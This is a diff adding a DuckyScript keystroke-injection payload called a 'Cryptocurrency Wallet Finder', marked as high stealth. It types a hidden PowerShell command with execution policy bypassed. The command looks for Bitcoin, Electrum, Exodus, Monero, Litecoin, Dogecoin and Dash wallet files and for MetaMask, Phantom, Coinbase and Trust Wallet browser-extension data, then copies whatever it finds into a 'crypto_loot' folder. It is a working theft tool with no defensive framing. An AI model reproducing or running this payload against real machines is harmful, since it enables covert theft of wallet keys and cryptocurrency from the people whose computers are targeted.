@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Cryptocurrency Wallet Finder
+REM  FLLC - by PERSON FU
+REM  Time: ~15 seconds | Stealth: HIGH
+REM  Locates crypto wallet files and configs
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\crypto_loot';md $d -f|Out-Null;$r=@();$r+='=== CRYPTO WALLET SCAN ===';$r+='Time: '+(Get-Date);$ap=$env:APPDATA;$la=$env:LOCALAPPDATA;$wallets=@{Bitcoin=\"$ap\Bitcoin\wallet.dat\";Bitcoin_Core=\"$ap\Bitcoin\wallets\";Electrum=\"$ap\Electrum\wallets\";Exodus=\"$ap\Exodus\exodus.wallet\";Metamask_Chrome=\"$la\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\";Metamask_Edge=\"$la\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm\";Metamask_Brave=\"$la\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\";Phantom=\"$la\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa\";Coinbase=\"$la\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad\";TrustWallet=\"$la\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph\";Monero=\"$ap\bitmonero\";Litecoin=\"$ap\Litecoin\wallet.dat\";Dogecoin=\"$ap\Dogecoin\wallet.dat\";Dash=\"$ap\DashCore\wallet.dat\"};foreach($w in $wallets.Keys){$p=$wallets[$w];if(Test-Path $p){$r+=\"[FOUND] $w : $p\";$wd=\"$d\$w\";md $wd -f|Out-Null;if((Get-Item $p).PSIsContainer){cp $p $wd -r -f 2>$null}else{cp $p $wd -f 2>$null}}else{$r+=\"[MISS] $w\"}};$r|Out-File \"$d\scan_results.txt\" -Encoding UTF8"
+ENTER
+DELAY 500
